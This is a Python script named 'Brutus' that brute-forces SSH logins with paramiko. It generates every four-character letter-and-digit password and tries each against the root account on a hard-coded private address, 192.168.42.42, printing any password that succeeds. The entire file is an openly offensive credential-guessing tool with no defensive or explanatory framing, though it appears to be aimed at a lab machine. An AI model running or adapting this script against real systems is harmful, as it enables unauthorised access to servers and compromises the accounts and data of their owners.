import itertools as it
import string
from utils import timefunc

import paramiko

def create_client():
    client_policy = paramiko.AutoAddPolicy()
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(client_policy)
    return client

class Brutus:
    def __init__(self, charset, length, ip):
        self.charset = charset
        self.length = length
        self.ip = ip

    @timefunc
    def crackit(self, username):
        timeout = '0.5'
        client = create_client()
        for guess in self.guesses:
            try:
                client.connect(self.ip, username=username, password=guess, timeout=timeout)
                return guess
            except paramiko.AuthenticationException as e:
                pass
            finally:
                client.close()

    @property
    def guesses(self):
        for guess in it.product(self.charset, repeat=self.length):
            yield ''.join(guess)

@timefunc
def main():
    charset = string.ascii_letters + string.digits
    ip = '192.168.42.42'
    username = 'root'
    brute = Brutus(charset, 4, ip)
    password = brute.crackit(username = username)
    if password:
        print('Found: {}'.format(password))


if __name__ == '__main__':
    main()
